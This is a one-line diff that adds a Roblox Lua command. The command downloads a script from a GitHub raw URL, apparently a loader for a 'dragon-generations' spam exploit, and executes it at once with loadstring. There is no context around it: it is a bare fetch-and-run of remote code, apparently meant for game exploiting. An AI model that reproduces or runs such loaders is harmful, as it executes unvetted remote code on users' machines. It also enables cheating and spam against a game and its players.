@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/dragon-generations-spam2-x2uf7k20o3ruof.lua"))()
